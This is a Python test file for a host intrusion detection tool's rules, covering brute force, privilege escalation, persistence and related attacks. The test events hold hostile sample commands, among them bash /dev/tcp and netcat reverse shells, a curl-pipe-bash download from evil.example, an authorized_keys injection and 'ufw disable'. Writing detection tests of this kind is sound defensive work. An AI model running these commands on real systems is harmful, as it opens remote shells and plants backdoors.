"""Tests for detection rules — at least ten distinct detections."""

from __future__ import annotations

from datetime import datetime, timezone

from sentinelai.core.models import Alert, EventCategory, EventType, Severity
from sentinelai.detection.rules.authentication import (
    ImpossibleFrequencyRule,
    RootLoginRule,
    SSHBruteForceRule,
    SuspiciousLoginHoursRule,
)
from sentinelai.detection.rules.docker_rules import SuspiciousDockerRule
from sentinelai.detection.rules.network import ReverseShellRule
from sentinelai.detection.rules.persistence import (
    SSHKeyManipulationRule,
    SuspiciousCronRule,
)
from sentinelai.detection.rules.privilege import PrivilegeEscalationRule, SudoAbuseRule
from sentinelai.detection.rules.system import FirewallModificationRule
from sentinelai.detection.rules.users import NewUserRule

from tests.conftest import make_event


def _drive(rule, events, ctx) -> list[Alert]:
    """Feed events through a rule, collecting every alert it raises."""
    alerts = []
    for event in events:
        alert = rule.evaluate(event, ctx)
        if alert is not None:
            alerts.append(alert)
    return alerts


class TestSSHBruteForce:
    def test_fires_at_threshold(self, rule_ctx) -> None:
        rule = SSHBruteForceRule()
        events = [
            make_event(
                offset=i, event_type=EventType.AUTH_FAILURE,
                category=EventCategory.AUTHENTICATION, ip="203.0.113.5", user="root",
            )
            for i in range(5)
        ]
        alerts = _drive(rule, events, rule_ctx)
        assert len(alerts) == 1
        assert alerts[0].rule_id == "R001"
        assert alerts[0].ip == "203.0.113.5"
        assert alerts[0].event_count >= 5

    def test_below_threshold_silent(self, rule_ctx) -> None:
        rule = SSHBruteForceRule()
        events = [
            make_event(offset=i, event_type=EventType.AUTH_FAILURE, ip="203.0.113.5")
            for i in range(4)
        ]
        assert _drive(rule, events, rule_ctx) == []

    def test_no_ip_ignored(self, rule_ctx) -> None:
        rule = SSHBruteForceRule()
        events = [
            make_event(offset=i, event_type=EventType.AUTH_FAILURE, ip=None)
            for i in range(6)
        ]
        assert _drive(rule, events, rule_ctx) == []


class TestRootLogin:
    def test_fires(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.ROOT_LOGIN, user="root", ip="203.0.113.5",
            severity=Severity.WARNING,
        )
        alert = RootLoginRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R005"

    def test_normal_login_ignored(self, rule_ctx) -> None:
        event = make_event(event_type=EventType.AUTH_SUCCESS, user="alice")
        assert RootLoginRule().evaluate(event, rule_ctx) is None


class TestImpossibleFrequency:
    def test_fires_on_machine_speed(self, rule_ctx) -> None:
        # 10 attempts within a 10s window from one IP.
        rule = ImpossibleFrequencyRule()
        events = [
            make_event(offset=i * 0.5, event_type=EventType.AUTH_FAILURE, ip="203.0.113.5")
            for i in range(10)
        ]
        alerts = _drive(rule, events, rule_ctx)
        assert len(alerts) == 1
        assert alerts[0].rule_id == "R006"
        assert alerts[0].context["attempts_per_second"] > 0


class TestSuspiciousLoginHours:
    def test_fires_at_night(self, rule_ctx) -> None:
        night = datetime(2026, 1, 7, 3, 0, 0, tzinfo=timezone.utc)
        event = make_event(event_type=EventType.AUTH_SUCCESS, user="alice", base=night)
        alert = SuspiciousLoginHoursRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R007"

    def test_silent_during_day(self, rule_ctx) -> None:
        noon = datetime(2026, 1, 7, 12, 0, 0, tzinfo=timezone.utc)
        event = make_event(event_type=EventType.AUTH_SUCCESS, user="alice", base=noon)
        assert SuspiciousLoginHoursRule().evaluate(event, rule_ctx) is None


class TestPrivilegeEscalation:
    def test_added_to_sudo_group(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.USER_MODIFIED, user="attacker",
            category=EventCategory.USER_MANAGEMENT, service="usermod",
            group="sudo",
        )
        alert = PrivilegeEscalationRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R012"

    def test_normal_group_ignored(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.USER_MODIFIED, user="alice", group="developers"
        )
        assert PrivilegeEscalationRule().evaluate(event, rule_ctx) is None


class TestReverseShell:
    def test_bash_dev_tcp(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.SUDO_COMMAND, user="root",
            command="/bin/bash -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
        )
        alert = ReverseShellRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R031"
        assert alert.severity is Severity.CRITICAL

    def test_nc_e(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.CRON_JOB, user="www-data",
            message="nc -e /bin/sh 203.0.113.5 4444", command="nc -e /bin/sh 203.0.113.5 4444",
        )
        assert ReverseShellRule().evaluate(event, rule_ctx) is not None

    def test_benign_command_ignored(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.SUDO_COMMAND, user="alice", command="/usr/bin/apt update"
        )
        assert ReverseShellRule().evaluate(event, rule_ctx) is None


class TestSuspiciousCron:
    def test_curl_pipe_bash(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.CRON_JOB, user="root",
            command="curl http://evil.example/x.sh | bash",
        )
        alert = SuspiciousCronRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R040"

    def test_benign_cron_ignored(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.CRON_JOB, user="root",
            command="/usr/local/bin/backup.sh",
        )
        assert SuspiciousCronRule().evaluate(event, rule_ctx) is None


class TestNewUser:
    def test_uid0_is_critical(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.USER_ADDED, user="backdoor",
            category=EventCategory.USER_MANAGEMENT, service="useradd", uid="0",
        )
        alert = NewUserRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R020"
        assert alert.severity is Severity.CRITICAL

    def test_normal_user_notice(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.USER_ADDED, user="deploy",
            service="useradd", uid="1005",
        )
        alert = NewUserRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.severity is Severity.NOTICE

    def test_service_account_suppressed(self, rule_ctx) -> None:
        for name in ("sshd", "www-data", "mysql", "nobody"):
            rule = NewUserRule()
            rule._uid_min = None
            event = make_event(
                event_type=EventType.USER_ADDED, user=name,
                service="useradd", uid="110",
            )
            assert rule.evaluate(event, rule_ctx) is None, f"{name} should be suppressed"

    def test_systemd_wildcard_suppressed(self, rule_ctx) -> None:
        rule = NewUserRule()
        rule._uid_min = None
        event = make_event(
            event_type=EventType.USER_ADDED, user="systemd-resolve",
            service="useradd", uid="101",
        )
        assert rule.evaluate(event, rule_ctx) is None

    def test_low_uid_system_account_suppressed(self, rule_ctx) -> None:
        rule = NewUserRule()
        rule._uid_min = None
        event = make_event(
            event_type=EventType.USER_ADDED, user="unknownsvc",
            service="useradd", uid="65",
        )
        assert rule.evaluate(event, rule_ctx) is None

    def test_uid0_never_suppressed_even_if_named_like_service(self, rule_ctx) -> None:
        rule = NewUserRule()
        rule._uid_min = None
        event = make_event(
            event_type=EventType.USER_ADDED, user="sshd",
            service="useradd", uid="0",
        )
        alert = rule.evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.severity is Severity.CRITICAL

    def test_custom_allowlist_suppresses(self, rule_ctx) -> None:
        rule_ctx.config.service_account_allowlist = ["myapp-*", "deploy"]
        rule = NewUserRule()
        rule._uid_min = None
        for name in ("myapp-worker", "deploy"):
            event = make_event(
                event_type=EventType.USER_ADDED, user=name,
                service="useradd", uid="2001",
            )
            assert rule.evaluate(event, rule_ctx) is None, f"{name} should be suppressed by custom allowlist"
        rule_ctx.config.service_account_allowlist = []

    def test_custom_uid_min(self, rule_ctx) -> None:
        rule_ctx.config.uid_min = 500
        rule = NewUserRule()
        rule._uid_min = None
        event = make_event(
            event_type=EventType.USER_ADDED, user="legacysvc",
            service="useradd", uid="499",
        )
        assert rule.evaluate(event, rule_ctx) is None
        event2 = make_event(
            event_type=EventType.USER_ADDED, user="realuser",
            service="useradd", uid="500",
        )
        alert = rule.evaluate(event2, rule_ctx)
        assert alert is not None
        assert alert.severity is Severity.NOTICE
        rule_ctx.config.uid_min = 0


class TestSSHKeyManipulation:
    def test_authorized_keys(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.SUDO_COMMAND, user="attacker",
            command="echo ssh-rsa AAAA... >> /home/root/.ssh/authorized_keys",
        )
        alert = SSHKeyManipulationRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R041"


class TestSudoAbuse:
    def test_sensitive_command(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.SUDO_COMMAND, user="alice",
            command="visudo",
        )
        alert = SudoAbuseRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R011"

    def test_repeated_failures(self, rule_ctx) -> None:
        rule = SudoAbuseRule()
        events = [
            make_event(
                offset=i, event_type=EventType.SUDO_FAILURE, user="alice",
                message="1 incorrect password attempts",
            )
            for i in range(3)
        ]
        alerts = _drive(rule, events, rule_ctx)
        assert len(alerts) == 1
        assert alerts[0].severity is Severity.ERROR


class TestFirewallModification:
    def test_ufw_disable(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.SUDO_COMMAND, user="attacker",
            command="ufw disable",
        )
        alert = FirewallModificationRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R051"


class TestSuspiciousDocker:
    def test_privileged_container(self, rule_ctx) -> None:
        event = make_event(
            event_type=EventType.CONTAINER_EVENT, category=EventCategory.DOCKER,
            service="docker", message="starting privileged container", privileged=True,
        )
        alert = SuspiciousDockerRule().evaluate(event, rule_ctx)
        assert alert is not None
        assert alert.rule_id == "R060"
